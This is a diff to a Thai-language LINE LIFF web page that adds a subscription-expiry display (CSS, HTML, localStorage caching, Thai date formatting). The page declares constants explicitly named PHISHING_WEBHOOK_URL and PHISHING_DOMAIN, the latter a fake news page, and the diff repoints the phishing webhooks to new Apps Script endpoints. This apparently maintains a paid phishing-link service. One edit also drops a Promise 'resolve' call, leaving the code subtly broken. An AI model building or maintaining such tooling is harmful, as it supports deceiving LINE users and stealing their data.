@@ -213,6 +213,27 @@
             border: 1px solid rgba(255, 193, 7, 0.3);
         }
 
+        /* เพิ่ม style สำหรับวันหมดอายุ */
+        .expiration-info {
+            margin-top: 5px;
+            font-size: 13px;
+            padding: 3px 8px;
+            border-radius: 4px;
+            display: inline-block;
+            background-color: rgba(88, 136, 231, 0.1);
+            color: var(--primary-dark);
+        }
+        
+        .expiration-info.expiring-soon {
+            background-color: rgba(255, 193, 7, 0.15);
+            color: #856404;
+        }
+        
+        .expiration-info.expired {
+            background-color: rgba(255, 82, 82, 0.1);
+            color: #721c24;
+        }
+
         /* Message Box */
         .message-box {
             background-color: rgba(255, 193, 7, 0.1);
@@ -667,6 +688,11 @@
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
+                        <div id="expirationContainer" style="display: none;">
+                            <span id="expirationInfo" class="expiration-info">
+                                <i class="fas fa-calendar-alt"></i> <span id="expirationText">วันหมดอายุ: ไม่ระบุ</span>
+                            </span>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -734,6 +760,7 @@
         let pictureUrl = "";
         let isLiffInitialized = false;
         let userHasPermission = false;
+        let userExpirationDate = null;
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -741,8 +768,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz8UEr7tAkzFHhYL1aoHPum0I2bqELZJdDVsj-wPMZv50IWZ4oA568xEzQ7LmaJ_w4t/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz8UEr7tAkzFHhYL1aoHPum0I2bqELZJdDVsj-wPMZv50IWZ4oA568xEzQ7LmaJ_w4t/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzqYFcTyWTaGJAOqHSgZOqxfG0sPa-UPg0XQEvahFk5mfmkJsRuxSOOYbUULmhU2ASU/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzqYFcTyWTaGJAOqHSgZOqxfG0sPa-UPg0XQEvahFk5mfmkJsRuxSOOYbUULmhU2ASU/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -831,7 +858,15 @@
                     if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
                         statusEl.textContent = originalText;
-                        return resolve(savedPermission === 'true');
+                        
+                        // ดึงข้อมูลวันหมดอายุจาก localStorage ด้วย
+                        const savedExpirationDate = localStorage.getItem('user_expiration_date_' + userId);
+                        if (savedExpirationDate) {
+                            userExpirationDate = new Date(savedExpirationDate);
+                            updateExpirationDisplay();
+                        }
+                        
+                        return savedPermission === 'true';
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -850,6 +885,7 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
+                            console.log("วันหมดอายุจาก API:", data.expirationDate || "ไม่ได้ระบุ");
                             
                             // บันทึกสิทธิ์ใน localStorage
                             try {
@@ -858,6 +894,12 @@
                                 // บันทึกข้อความสถานะด้วยถ้ามี
                                 if (data.userStatus) {
                                     localStorage.setItem('user_status_' + userId, data.userStatus);
+                                }
+                                // บันทึกวันหมดอายุด้วยถ้ามี
+                                if (data.expirationDate) {
+                                    localStorage.setItem('user_expiration_date_' + userId, data.expirationDate);
+                                    userExpirationDate = new Date(data.expirationDate);
+                                    updateExpirationDisplay();
                                 }
                             } catch (e) {
                                 console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
@@ -933,7 +975,7 @@
                 return checkUserPermissionFallback(userId);
             }
         }
-
+        
         // ตรวจสอบสิทธิ์แบบสำรอง - ปรับปรุงให้เข้มงวดขึ้น
         function checkUserPermissionFallback(userId) {
             console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
@@ -980,6 +1022,51 @@
             }
             
             return hasAccess;
+        }
+        
+        // แสดงข้อมูลวันหมดอายุ
+        function updateExpirationDisplay() {
+            const container = document.getElementById('expirationContainer');
+            const expirationInfo = document.getElementById('expirationInfo');
+            const expirationText = document.getElementById('expirationText');
+            
+            if (!userExpirationDate || isNaN(userExpirationDate)) {
+                container.style.display = 'none';
+                return;
+            }
+            
+            // แสดงวันที่หมดอายุ
+            const now = new Date();
+            const diffDays = Math.ceil((userExpirationDate - now) / (1000 * 60 * 60 * 24));
+            
+            container.style.display = 'block';
+            
+            if (userExpirationDate < now) {
+                // หมดอายุแล้ว
+                expirationInfo.className = 'expiration-info expired';
+                expirationText.innerHTML = `<i class="fas fa-exclamation-circle"></i> หมดอายุแล้ว`;
+            } else if (diffDays <= 7) {
+                // ใกล้หมดอายุ (7 วัน)
+                expirationInfo.className = 'expiration-info expiring-soon';
+                expirationText.innerHTML = `<i class="fas fa-exclamation-triangle"></i> เหลือ ${diffDays} วัน`;
+            } else {
+                // ปกติ
+                expirationInfo.className = 'expiration-info';
+                expirationText.textContent = `วันหมดอายุ: ${formatDateThai(userExpirationDate)}`;
+            }
+        }
+        
+        // ฟอร์แมตวันที่เป็นภาษาไทย
+        function formatDateThai(date) {
+            if (!date || isNaN(date)) return "ไม่ระบุ";
+            
+            const thaiMonths = ['ม.ค.', 'ก.พ.', 'มี.ค.', 'เม.ย.', 'พ.ค.', 'มิ.ย.', 'ก.ค.', 'ส.ค.', 'ก.ย.', 'ต.ค.', 'พ.ย.', 'ธ.ค.'];
+            
+            const day = date.getDate();
+            const month = thaiMonths[date.getMonth()];
+            const year = date.getFullYear() + 543; // แปลงเป็น พ.ศ.
+            
+            return `${day} ${month} ${year}`;
         }
         
         // เปิดใช้งานฟอร์ม
